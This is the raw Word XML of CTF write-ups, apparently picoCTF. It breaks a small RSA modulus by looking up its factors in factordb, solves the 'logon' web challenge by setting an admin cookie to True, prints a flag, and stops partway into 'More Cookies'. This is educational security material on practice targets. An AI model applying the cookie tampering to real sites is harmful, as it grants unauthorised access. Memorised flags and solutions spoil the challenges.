          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E2C19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Category: Cryptography &lt;/br&gt; AUTHOR: SARA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2945A6"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Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C61C6F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In RSA, a small e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-keyword"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be problematic, but what about N? Can you decrypt </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-keyword"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1A235B" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Values</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCB340C"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have been given the following values:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D988FF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Decrypt my </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-keyword"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>super</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sick RSA:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D7EE3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c: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>843044897663847841476319711639772861390329326681532977209935413827620909782846667</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DB8F9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n: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>1422450808944701344261903748621562998784243662042303391362692043823716783771691667</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401FC615"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>65537</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFED8A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 is the ciphertext we wish to decode. N is the result of multiplying two prime numbers p and q, ie. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>n = p * q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>. E is the multiplicative inverse of a private exponent </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> modulo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>phi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>. Phi is equal to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>(p-1)*(q-1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>. Here in a more ordered fashion:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C9CA38"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C = ciphertext</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5F9A7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 and q = prime numbers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB68693"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n = p * q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27559516"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phi = (p-1) * (q-1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1945451C" w14:textId="7E0F416E"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 some number that 1 &lt; e &lt; phi and gcd(e,phi) == 1 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4E23F4" w14:textId="50C9F692" w:rsidR="00FF69C5" w:rsidRDefault="00FF69C5"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Fonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="BDC1C6"/>
          <w:shd w:val="clear" w:color="auto" w:fill="202124"/>
        </w:rPr>
        <w:t>In mathematics, the greatest common divisor (GCD) of two or more integers, which are not all zero, is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF7866"/>
          <w:shd w:val="clear" w:color="auto" w:fill="202124"/>
        </w:rPr>
        <w:t>the largest positive integer that divides each of the integers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="BDC1C6"/>
          <w:shd w:val="clear" w:color="auto" w:fill="202124"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11790E0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d = e^(-1) mod phi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1BE7A0"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Great! Now we just need to find p and q...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0591D11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Factor db</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460F7C2E" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00000000" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="135" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId97" w:history="1">
        <w:r w:rsidR="00786656">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="OpenSymbol" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Factordb</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00786656">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> is a database of factorised numbers. We could try out n:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1BD138" w14:textId="523FD594"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ljs-attr"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>n</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1899107986527483535344517113948531328331</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674357869540600933870145899564746495319033</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55362962"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Awesome! Now we can just calculate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DE7ED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lastRenderedPageBreak/>
        <w:t>Solving</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9EDCF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62324783949134119159408816513334912534343517300880137691662780895409992760262021</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8F4997"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1280678415822214057864524798453297819181910621573945477544758171055968245116423923</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0007149B"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65537</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAE1D41"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1899107986527483535344517113948531328331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A52120"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674357869540600933870145899564746495319033</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF4C04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1818D8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p>
    <w:p w14:paraId="521E77B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i</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p>
    <w:p w14:paraId="75E45A6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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>for</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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>in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
    <w:p w14:paraId="546C61CE"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CF0ED9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21D74D7D"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phi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BC47E83"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1C365A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i</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2AA0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A4C384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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1917859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#If a third parameter is present, it returns x to the power of y, modulus z.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366D83A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#c ^d %n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22601FD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p>
    <w:p w14:paraId="5CB25F3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4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>bytes</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fromhex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2</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decode</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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>'ascii'</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414B8C77" w14:textId="77777777" w:rsidR="00786656" w:rsidRPr="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7153CCC3" w14:textId="29888BB3" w:rsidR="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76641B3B" w14:textId="79759207" w:rsidR="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E701074" w14:textId="3C4F5D40" w:rsidR="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BB933B8" w14:textId="1B020106" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36EDFB3A" w14:textId="62CBB4D0" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BE47A1C" w14:textId="472D6940" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="342B975D" w14:textId="075A9FD5" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AB26813" w14:textId="694F757F" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="285B65C0" w14:textId="555B3DB5" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="285B231F" w14:textId="4B5F11FC" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50AA7045" w14:textId="77777777" w:rsidR="00792834" w:rsidRPr="00792834" w:rsidRDefault="00792834" w:rsidP="00792834">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00792834">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>logon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A1D717"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CC566E6"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Tags: picoCTF 2019Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C093B5A" w14:textId="77777777" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="0079283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BOBSON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6936D591" w14:textId="77777777" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="0079283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AC0EC3" w14:textId="63DC7EE1"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factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/13594/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId98"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99" w:history="1">
        <w:r w:rsidRPr="00E22B69">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:13594</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1CFC5D80" w14:textId="640AEC5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21AAB77" wp14:editId="2430BB7D">
            <wp:extent cx="5692633" cy="3154953"/>
            <wp:effectExtent l="0" t="0" r="381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00"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5692633" cy="3154953"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C859643" w14:textId="399C0DEB"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0938308" w14:textId="265AF0F6"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46AF96DC" wp14:editId="263DA7CB">
            <wp:extent cx="6332220" cy="32677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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3267710"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DADB85" w14:textId="2C24421A"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0608AF8C" w14:textId="4421F8E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Change admin to True and then refresh the page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4895AD" w14:textId="2F886775"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F5C780" wp14:editId="55F344BA">
            <wp:extent cx="4130398" cy="1165961"/>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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4130398" cy="1165961"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2B0C28" w14:textId="16578722"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6E7CEA9" wp14:editId="0EC98413">
            <wp:extent cx="6332220" cy="172910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03"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1729105"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F148C3D" w14:textId="02550217"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23DDEA3" w14:textId="100FD5D9" w:rsidR="00792834" w:rsidRDefault="000A6F2E" w:rsidP="00792834">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A6F2E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1941D374" w14:textId="06F9C56C" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="371773B6" w14:textId="19BEDECB" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A75C4C6" w14:textId="230AAE28" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BC80048" w14:textId="72BFBC7E" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40AF352B" w14:textId="1C979527" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CDF00D8" w14:textId="12CC7168" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001C530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More Cookies</w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523026EC"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1C521E61"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15641F45" w14:textId="77777777" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001C530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3D105E1A" w14:textId="77777777" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001C530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7F6E296" w14:textId="275D2144" w:rsidR="001C530B" w:rsidRDefault="001C530B"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 forgot </w:t>
      </w:r>
      <w:r w:rsidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">ookies can </w:t>
      </w:r>
      <w:r w:rsidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
